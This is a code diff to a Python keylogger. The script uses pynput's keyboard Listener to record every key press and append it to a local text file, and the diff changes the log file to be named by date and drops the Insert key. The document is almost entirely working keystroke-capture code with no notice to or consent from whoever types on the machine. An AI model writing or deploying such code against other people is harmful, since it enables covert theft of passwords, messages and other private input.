@@ -1,8 +1,13 @@
-from pynput.keyboard import  Listener
+from pynput.keyboard import Listener
+from datetime import datetime
+
 
 
 def write_to_file(key):
     letter = str(key)
+    datelogname = datetime.today().strftime('%m-%d-%Y')       # to be used for naming the log with the date in it.
+    datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M:%S %p')
+
 
     # replaces the double quotes with  a space. Plus, it allows us to add  a space between the letters.
     # letter = letter.replace("'", " ")
@@ -122,8 +127,12 @@ def write_to_file(key):
     if letter == 'Key.up':
         letter = ''
 
-    with open("log.txt", 'a') as f:  # to create a file/open it and write to it.
-        f.write(letter)  # writes to the file with the quoted text to the file
+    if letter == 'Key.insert':
+        letter = ''
+
+
+    with open(datelogname + "log.txt", 'a') as f:
+      f.write(letter)  # writes to the file with the quoted text to the file
 
 
 with Listener(on_press=write_to_file) as l:  # listener is basically L in this case. This will run when you press a key.
